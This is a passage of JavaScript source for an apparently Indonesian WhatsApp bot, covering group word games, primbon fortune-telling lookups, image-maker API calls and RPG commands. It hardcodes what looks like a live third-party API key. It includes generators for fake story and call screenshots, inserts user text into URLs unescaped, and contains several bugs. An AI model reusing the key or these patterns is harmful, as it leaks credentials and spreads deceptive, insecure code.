      if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/yulibocil.json')
      if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/yumeko.json')
      let yeha = heyy[Math.floor(Math.random() * heyy.length)]
      sock.sendMessage(m.chat, {
        image: {
          url: yeha
        },
        caption: "",
        viewOnce: true,
        contextInfo: {
isForwarded: false, 
forwardingScore: 9999, 
  },
      }, {
        quoted: fakeQuoted
      })
    }
    break
    //############ [ GAME ]
case 'tebakkata': 
if (!isGroup) return reply(mess.group)
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./Game/tebakkata.json')));
console.log('Jawaban : '+jawaban)
await reply(`*GAME TEBAK KATA*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
tebakkata = {
soal: soal,
jawaban: jawaban.toLowerCase(),
waktu: setTimeout(function () {
if (tebakkata) reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete tebakkata
}, gamewaktu * 1000)
}
break 
case 'asahotak': 
if (!isGroup) return reply(mess.group)
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./Game/asahotak.json')));
console.log('Jawaban : '+jawaban)
await reply(`*GAME ASAH OTAK*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
asahotak = {
soal: soal,
jawaban: jawaban.toLowerCase(),
waktu: setTimeout(function () {
if (asahotak) reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete asahotak
}, gamewaktu * 1000)
}
break           
case 'susunkata': 
if (!isGroup) return reply(mess.group)
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./Game/susunkata.json')));
console.log('Jawaban : '+jawaban)
await reply(`*GAME SUSUN KATA*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
susunkata = {
soal: soal,
jawaban: jawaban.toLowerCase(),
waktu: setTimeout(function () {
if (asahotak) reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete susunkata
}, gamewaktu * 1000)
}
break           
case 'tebakgambar':
if (!isGroup) return reply(mess.group)
var { img, jawaban, deskripsi } = pickRandom(JSON.parse(fs.readFileSync('./Game/tebakgambar.json')));
console.log('Jawaban : '+jawaban)
var teks1 = `*GAME TEBAK GAMBAR*\n\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nDeskripsi: ${deskripsi}\nWaktu: ${gamewaktu} detik`
await sock.sendMessage(from, {image: {url: img}, caption: teks1}, {quoted: fakeQuoted})
tebakgambar = {
soal: img,
jawaban: jawaban.toLowerCase(),
waktu: setTimeout(function () {
if (tebakgambar) reply(`Waktu habis!\nJawabannya adalah: ${monospace(jawaban)}`);
delete tebakgambar
}, gamewaktu * 1000)
}
break
case 'tebakbendera': 
if (!isGroup) return reply(mess.group)
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./Game/tebakbendera.json')));
console.log('Jawaban : '+jawaban)
await reply(`*GAME TEBAK BENDERA*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
tebakbendera = {
soal: soal,
jawaban: jawaban.toLowerCase(),
waktu: setTimeout(function () {
if (tebakbendera[from]) reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete tebakbendera
}, gamewaktu * 1000)
}
break
case 'tebakkimia': 
if (!isGroup) return reply(mess.group)
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./Game/tebakkimia.json')));
console.log('Jawaban : '+jawaban)
await reply(`*GAME ASAH OTAK*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
tebakkimia = {
soal: soal,
jawaban: jawaban.toLowerCase(),
waktu: setTimeout(function () {
if (asahotak) reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete tebakkimia
}, gamewaktu * 1000)
}
break        
case 'family100': case 'f100': 
if (!isGroup) return reply(mess.group)
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./Game/family100.json')));
console.log('Jawaban : '+jawaban)
let famil = []
for (let i of jawaban){
let fefsh = i.split('/') ? i.split('/')[0] : i
let iuhbs = fefsh.startsWith(' ') ? fefsh.replace(' ','') : fefsh
let axsfh = iuhbs.endsWith(' ') ? iuhbs.replace(iuhbs.slice(-1), '') : iuhbs
famil.push(axsfh.toLowerCase())
}
await reply(`*GAME FAMILY 100*\n\nSoal: ${soal}\nTotal Jawaban: ${jawaban.length}\n\nWaktu: ${gamewaktu} detik`)
family = {
soal: soal,
jawaban: famil,
waktu: setTimeout(async function () {
if (global.family) {
let teks = `*WAKTU HABIS!*\nJawaban yang belum terjawab :\n\n`
let jwb = family.jawaban
for (let i of jwb){teks += `\n${i}`}
reply(teks)
delete family
};
}, gamewaktu * 1000)
}

break   

/*
   PRIMBON
*/

case 'artimimpi': case 'tafsirmimpi': {

if (!text) return reply(`Contoh : ${cmd} belanja`)
let anu = await primbon.tafsir_mimpi(text)
if (anu.status == false) return reply(anu.message)
reply(`• *Mimpi :* ${anu.message.mimpi}\n• *Arti :* ${anu.message.arti}\n• *Solusi :* ${anu.message.solusi}`)
}
break
case 'ramalanjodoh': case 'ramaljodoh': {

if (!text) return reply(`Contoh : ${cmd} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'ramalanjodohbali': case 'ramaljodohbali': {

if (!text) return reply(`Contoh : ${cmd} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'suamiistri': {

if (!text) return reply(`Contoh : ${cmd} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama Suami :* ${anu.message.suami.nama}\n• *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n• *Nama Istri :* ${anu.message.istri.nama}\n• *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'ramalancinta': case 'ramalcinta': {

if (!text) return reply(`Contoh : ${cmd} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Sisi Positif :* ${anu.message.sisi_positif}\n• *Sisi Negatif :* ${anu.message.sisi_negatif}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'artinama': {

if (!text) return reply(`Contoh : ${cmd} Dika Ardianta`)
let anu = await primbon.arti_nama(text)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama :* ${anu.message.nama}\n• *Arti :* ${anu.message.arti}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'kecocokannama': case 'cocoknama': {

if (!text) return reply(`Contoh : ${cmd} Dika, 7, 7, 2005`)
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Life Path :* ${anu.message.life_path}\n• *Destiny :* ${anu.message.destiny}\n• *Destiny Desire :* ${anu.message.destiny_desire}\n• *Personality :* ${anu.message.personality}\n• *Persentase :* ${anu.message.persentase_kecocokan}`)
}
break
case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {

if (!text) return reply(`Contoh : ${cmd} Dika|Novia`)
let [nama1, nama2] = text.split`|`
let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
if (anu.status == false) return reply(anu.message)
sock.sendImage(m.chat,  anu.message.gambar, `• *Nama Anda :* ${anu.message.nama_anda}\n• *Nama Pasangan :* ${anu.message.nama_pasangan}\n• *Sisi Positif :* ${anu.message.sisi_positif}\n• *Sisi Negatif :* ${anu.message.sisi_negatif}`)
}
break
case 'jadianpernikahan': case 'jadiannikah': {

if (!text) return reply(`Contoh : ${cmd} 6, 12, 2020`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Tanggal Pernikahan :* ${anu.message.tanggal}\n• *karakteristik :* ${anu.message.karakteristik}`)
}
break
case 'sifatusaha': {

if (!ext)return reply(`Contoh : ${prefix+ command} 28, 12, 2021`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Lahir :* ${anu.message.hari_lahir}\n• *Usaha :* ${anu.message.usaha}`)
}
break
case  ' rejeki': case 'rezeki': {

if (!text) return reply(`Contoh : ${cmd} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Lahir :* ${anu.message.hari_lahir}\n• *Rezeki :* ${anu.message.rejeki}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'pekerjaan': {

if (!text) return reply(`Contoh : ${cmd} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Lahir :* ${anu.message.hari_lahir}\n• *Pekerjaan :* ${anu.message.pekerjaan}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'ramalannasib': case 'ramalnasib': case 'nasib': {

if (!text) return reply(`Contoh : 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.ramalan_nasib(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Analisa :* ${anu.message.analisa}\n• *Angka Akar :* ${anu.message.angka_akar}\n• *Sifat :* ${anu.message.sifat}\n• *Elemen :* ${anu.message.elemen}\n• *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`)
}
break
case 'potensipenyakit': case 'penyakit': {

if (!text) return reply(`Contoh : ${cmd} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Analisa :* ${anu.message.analisa}\n• *Sektor :* ${anu.message.sektor}\n• *Elemen :* ${anu.message.elemen}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'artitarot': case 'tarot': {

if (!text) return reply(`Contoh : ${cmd} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
sock.sendImage(m.chat, anu.message.image, `• *Lahir :* ${anu.message.tgl_lahir}\n• *Simbol Tarot :* ${anu.message.simbol_tarot}\n• *Arti :* ${anu.message.arti}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'fengshui': {

if (!text) return `Contoh : ${cmd} Dika, 1, 2005\n\nNote : ${cmd} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
let [nama, gender, tahun] = text.split`,`
let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tahun_lahir}\n• *Gender :* ${anu.message.jenis_kelamin}\n• *Angka Kua :* ${anu.message.angka_kua}\n• *Kelompok :* ${anu.message.kelompok}\n• *Karakter :* ${anu.message.karakter}\n• *Sektor Baik :* ${anu.message.sektor_baik}\n• *Sektor Buruk :* ${anu.message.sektor_buruk}`)
}
break
case 'haribaik': {

if (!text) return reply(`Contoh : ${cmd} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.petung_hari_baik(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Lahir :* ${anu.message.tgl_lahir}\n• *Kala Tinantang :* ${anu.message.kala_tinantang}\n• *Info :* ${anu.message.info}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'harisangar': case 'taliwangke': {

if (!text) return reply(`Contoh : ${cmd} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Lahir :* ${anu.message.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Info :* ${anu.message.info}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'harinaas': case 'harisial': {

if (!text) return reply(`Contoh : ${cmd} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Hari Lahir :* ${anu.message.hari_lahir}\n• *Tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Hari Naas :* ${anu.message.hari_naas}\n• *Info :* ${anu.message.catatan}\n• *Catatan :* ${anu.message.info}`)
}
break
case 'nagahari': case 'harinaga': {

if (!text) return reply(`Contoh : ${cmd} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Hari Lahir :* ${anu.message.hari_lahir}\n• *Tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'arahrejeki': case 'arahrezeki': {

if (!text) return reply(`Contoh : ${cmd} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Hari Lahir :* ${anu.message.hari_lahir}\n• *tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Arah Rezeki :* ${anu.message.arah_rejeki}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'peruntungan': {

if (!text) return reply(`Contoh : ${cmd} DIka, 7, 7, 2005, 2022\n\nNote : ${cmd} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`)
let [nama, tgl, bln, thn, untuk] = text.split`,`
let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'weton': case 'wetonjawa': {

if (!text) return reply(`Contoh : ${cmd} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.weton_jawa(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Tanggal :* ${anu.message.tanggal}\n• *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n• *Watak Hari :* ${anu.message.watak_hari}\n• *Naga Hari :* ${anu.message.naga_hari}\n• *Jam Baik :* ${anu.message.jam_baik}\n• *Watak Kelahiran :* ${anu.message.watak_kelahiran}`)
}
break
case 'sifat': case 'karakter': {

if (!text) return reply(`Contoh : ${cmd} Dika, 7, 7, 2005`)
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Garis Hidup :* ${anu.message.garis_hidup}`)
}
break
case 'keberuntungan': {

if (!text) return reply(`Contoh : ${cmd} Dika, 7, 7, 2005`)
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Hasil :* ${anu.message.result}`)
}
break
case 'memancing': {

if (!text) return reply(`Contoh : ${cmd} 12, 1, 2022`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Tanggal :* ${anu.message.tgl_memancing}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
}
break

case 'masasubur': {

if (!text) return reply(`Contoh : ${cmd} 12, 1, 2022, 28\n\nNote : ${cmd} hari pertama menstruasi, siklus`)
let [tgl, bln, thn, siklus] = text.split`,`
let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
if (anu.status == false) return reply(anu.message)
reply(`• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'zodiak': case 'zodiac': {

if (!text) return reply(`Contoh : ${prefix+ command} 7 7 2005`)
let zodiak = [
["capricorn", new Date(1970, 0, 1)],
["aquarius", new Date(1970, 0, 20)],
["pisces", new Date(1970, 1, 19)],
["aries", new Date(1970, 2, 21)],
["taurus", new Date(1970, 3, 21)],
["gemini", new Date(1970, 4, 21)],
["cancer", new Date(1970, 5, 22)],
["leo", new Date(1970, 6, 23)],
["virgo", new Date(1970, 7, 23)],
["libra", new Date(1970, 8, 23)],
["scorpio", new Date(1970, 9, 23)],
["sagittarius", new Date(1970, 10, 22)],
["capricorn", new Date(1970, 11, 22)]
].reverse()

function getZodiac(month, day) {
let d = new Date(1970, month - 1, day)
return zodiak.find(([_,_d]) => d >= _d)[0]
}
let date = new Date(text)
if (date == 'Invalid Date') return date
let d = new Date()
let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]

let zodiac = await getZodiac(birth[1], birth[2])

let anu = await primbon.zodiak(zodiac)
if (anu.status == false) return reply(anu.message)
reply(`• *Zodiak :* ${anu.message.zodiak}\n• *Nomor :* ${anu.message.nomor_keberuntungan}\n• *Aroma :* ${anu.message.aroma_keberuntungan}\n• *Planet :* ${anu.message.planet_yang_mengitari}\n• *Bunga :* ${anu.message.bunga_keberuntungan}\n• *Warna :* ${anu.message.warna_keberuntungan}\n• *Batu :* ${anu.message.batu_keberuntungan}\n• *Elemen :* ${anu.message.elemen_keberuntungan}\n• *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'shio': {

if (!text) return reply(`Contoh : ${cmd} tikus\n\nNote : For Detail https://primbon.com/shio.htm`)
let anu = await primbon.shio(text)
if (anu.status == false) return reply(anu.message)
reply(`• *Hasil :* ${anu.message}`)
}
break
/*
      MAKER
     
*/
case "gura":
case "togura": {
const q = m.quoted ? m.quoted : m;
    const mime = (q.msg || q).mimetype || '';
 
    if (!/image/.test(mime)) {
        return reply(`mana foto nya?`);
    }
 
    reply('Loading...');

    try {
        
        let media = await sock.downloadAndSaveMediaMessage(quoted);
        let directLink = await uploaden(media);
        
        const apiUrl = `https://api.nekolabs.web.id/canvas/gura?imageUrl=${directLink}`;
        
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const imageBuffer = Buffer.from(response.data);
 
        const finalCaption = ``;
 
        await sock.sendMessage(m.chat, {
            image: imageBuffer,
            caption: ""
        }, { quoted: fakeQuoted });
 
    } catch (error) {
        console.error('Error di fitur aiedit:', error);
        reply(`❌ Terjadi kesalahan saat memproses gambar.`);
    } finally {
        if (mediaPath && fs.existsSync(mediaPath)) {
            fs.unlinkSync(mediaPath);
        }
    }
}
break
case 'txttoimg':
case 'texttoimage':
case 'text2image':
case 'txt2img': {
    if (!text) return reply(`Contoh:\n${prefix + command} kucing lucu gaya ghibli`);
const api = {
  xterm: {
    url: "https://api.termai.cc",
    key: "TermAI-4ALwMabCh0KiN9I3"
  }
};
    try {
        const prompt = encodeURIComponent(text);
        const url = `${api.xterm.url}/api/text2img/dalle3?prompt=${prompt}&key=${api.xterm.key}`;

        let res = await fetch(url);
        if (!res.ok) return reply(`Gagal memproses, status: ${res.status}`);

        let buffer = Buffer.from(await res.arrayBuffer());

        await sock.sendMessage(m.chat, {
            image: buffer,
            caption: `Prompt: ${text}`
        }, { quoted: fakeQuoted });

    } catch (err) {
        console.error(err);
        reply("Terjadi kesalahan saat generate gambar.");
    }
}
break;
case 'fakestoryig':
case 'fakestory': {

if (!text) return m.reply(`Contoh: ${cmd} Lyrra`)
const avatar = await sock.profilePictureUrl(m.sender, "image").catch(() => 'https://files.catbox.moe/nwvkbt.png')
  await sock.sendMessage(m.chat, {image: {url: `https://api.zenzxz.my.id/api/maker/fakestory?username=${pushname}&caption=${text}&ppurl=${avatar}` }, caption: "" }, {quoted: fakeQuoted})
}
break
case 'fakecallwa':
case 'fakecall': {

if (!text) return m.reply(`Contoh: ${cmd} Marin | 19.00`)
  let [l, r] = text.split`|`
if (!l) l = ''
if (!r) r = ''
const avatar = await sock.profilePictureUrl(m.sender, "image").catch(() => 'https://files.catbox.moe/nwvkbt.png')
  await sock.sendMessage(m.chat, {image: {url: `https://api.zenzxz.my.id/api/maker/fakecall?nama=${l}&durasi=${r}&avatar=${avatar}` }, caption: "" }, {quoted: fakeQuoted})
}
break
case 'carboncodeimage':
case 'carbonify': {

if (!text) return m.reply(`Contoh: ${cmd} Lyrra`)
  
  await sock.sendMessage(m.chat, {image: {url: `https://api.zenzxz.my.id/api/maker/carbonify?input=${text}&title=${pushname}` }, caption: "" }, {quoted: fakeQuoted})
}
break
case 'textonimage':
case 'animegirl': {

if (!text) return m.reply(`Contoh: ${cmd} Lyrra`)
  
  await sock.sendMessage(m.chat, {image: {url: `https://api.zenzxz.my.id/api/maker/animegirl/image?text=${text}` }, caption: "" }, {quoted: fakeQuoted})
}
break

case 'bratfoto':
case 'bratgenerator': {

if (!text) return m.reply(`Contoh: ${cmd} beautiful girl with handsome man`)
    
    await sock.sendMessage(m.chat, {image: {url: `https://aqul-brat.hf.space/?text=${text}` }, caption: "" }, {quoted: fakeQuoted})
}
break
case 'pakustad':
case 'pak-ustad': {

if (!text) return m.reply(`Contoh: ${cmd} kenapa sock ganteng`)
    
    await sock.sendMessage(m.chat, {image: {url: `https://api.taka.my.id/tanya-ustad?quest=${text}` }, caption: "" }, {quoted: fakeQuoted})
}
break
case 'nglgenerator':
case 'ngl': {

if (!text) return m.reply(`Contoh: ${cmd} beautiful girl with handsome man`)
    
    await sock.sendMessage(m.chat, {image: {url: `https://api.taka.my.id/ngl?text=${text}` }, caption: "" }, {quoted: fakeQuoted})
}
break
    case 'attp': {

const quo = args.length >= 1 ? args.join(" ") : m.quoted?.text || m.quoted?.caption || m.quoted?.description || null;
//if (!m.isGroup) return Reply('*`maybee` fitur ini hanya untuk di grup*')
 if (!quo) return m.reply("masukan teksnya woii");
 
async function brat(text) {
 try {
 return await new Promise((resolve, reject) => {
 if(!text) return reject("missing text input");
 axios.get(`https://anabot.my.id/api/maker/attp?text=${text}&apikey=freeApikey`, {
 params: {
 },
 responseType: "arraybuffer"
 }).then(res => {
 const image = Buffer.from(res.data);
 if(image.length <= 10240) return reject("failed generate brat");
 return resolve({
 success: true, 
 image
 })
 })
 })
 } catch (e) {
 return {
 success: false,
 errors: e
 }
 delete sock.enhancer[sender];
 sock.sendMessage(m.chat, { react: { text: '✅', key: m.key }})
 }
}

const buf = await brat(quo);
await sock.sendImageAsSticker(m.chat, buf.image, m, { packname: "", author: "" })
}
break
case 'pak-ustad2':
case 'pakustad2': {

const quo = args.length >= 1 ? args.join(" ") : m.quoted?.text || m.quoted?.caption || m.quoted?.description || null;
//if (!m.isGroup) return Reply('*`maybee` fitur ini hanya untuk di grup*')
 if (!quo) return m.reply("masukan teksnya woii");
 
async function brat(text) {
 try {
 return await new Promise((resolve, reject) => {
 if(!text) return reject("missing text input");
 axios.get(`https://api.taka.my.id/tanya-ustad?quest=${text}`, {
 params: {
 },
 responseType: "arraybuffer"
 }).then(res => {
 const image = Buffer.from(res.data);
 if(image.length <= 10240) return reject("failed generate brat");
 return resolve({
 success: true, 
 image
 })
 })
 })
 } catch (e) {
 return {
 success: false,
 errors: e
 }
 delete sock.enhancer[sender];
 sock.sendMessage(m.chat, { react: { text: '✅', key: m.key }})
 }
}

const buf = await brat(quo);
await sock.sendImageAsSticker(m.chat, buf.image, m, { packname: "", author: "" })
}
break

// RPG
case 'joinrpg': {

if (setting.rpgsetStats) return m.reply('Fitur rpg dimatikan oleh owner')
      if (global.db.erpg[m.sender].rpg) return m.reply(`Kamu Telah Join Sebelumnya`)
      global.db.erpg[m.sender].rpg = true
      let joinedrpg = `*GAME RPG STARTED*\n\nKamu telah login RPG-Game, sekarang kamu dapat menggunakan command RPG`
      await sock.sendMessage(m.chat, {
        text: joinedrpg,
        contextInfo: {
          mentionedJid: [m.sender],
          forwardingScore: 9999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: null + "@newsletter",
            serverMessageId: null,
            newsletterName: `${namaBot}`
          },
          externalAdReply: {
            title: "RPG-GAME (Pirate Adventure)",
            body: 'Pirate adventure in search of riches',
            thumbnailUrl: "https://telegra.ph/file/d661d7829411b8bff9f5f.jpg",
            sourceUrl: "-",
            mediaType: 1,
            renderLargerThumbnail: true
          }
        }
      }, {
        quoted: fakeQuoted
      })
    }
    break

    case 'exitrpg': {

if (setting.rpgsetStats) return m.reply('Fitur rpg dimatikan oleh owner')
      global.db.erpg[m.sender].rpg = false
      let joinedrpg = `*GAME RPG EXIT*\n\nKamu telah exit RPG-Game, sekarang kamu tidak dapat menggunakan command RPG`
      await sock.sendMessage(m.chat, {
        text: joinedrpg,
        contextInfo: {
          mentionedJid: [m.sender],
          forwardingScore: 9999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: null + "@newsletter",
            serverMessageId: null,
            newsletterName: `${namaBot}`
          },
          externalAdReply: {
            title: "RPG-GAME EXIT",
            body: '-',
            thumbnailUrl: "https://telegra.ph/file/1c66154afd9707a84a4a3-1428c0a054c1effa10.jpg",
            sourceUrl: "-",
            mediaType: 1,
            renderLargerThumbnail: true
          }
        }
      }, {
        quoted: fakeQuoted
      })
    }
    break

    case 'wikwik': {

if (setting.rpgsetStats) return m.reply('Fitur rpg dimatikan oleh owner')
      if (!global.db.erpg[m.sender].rpg) return m.reply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
      if (global.db.erpg[m.sender].stamina <= 15) return m.reply(`Kamu tidak bisa ewe anak orang, stamina kamu ${global.db.erpg[m.sender].stamina}%\n\nPulihkan stamina menggunakan potion,\nContoh : .heal`)
      if (!q) return m.reply(`Contoh: ${cmd} sock`)
      const argsLower = args.map(arg => arg.toLowerCase());
      const petarung1 = argsLower[0];
      const petarung2 = argsLower[1];
      const totalRounds = 8;
      let ronde = 1;
      let nyawaPetarung1 = 200;
      let nyawaPetarung2 = 200;

      let result = `🫶 Wikwik antara ${db.users[m.sender].nama} dan ${args[0]} dimulai!\n\n`;

      while (ronde <= totalRounds && nyawaPetarung1 > 0 && nyawaPetarung2 > 0) {
        const pukulan = [
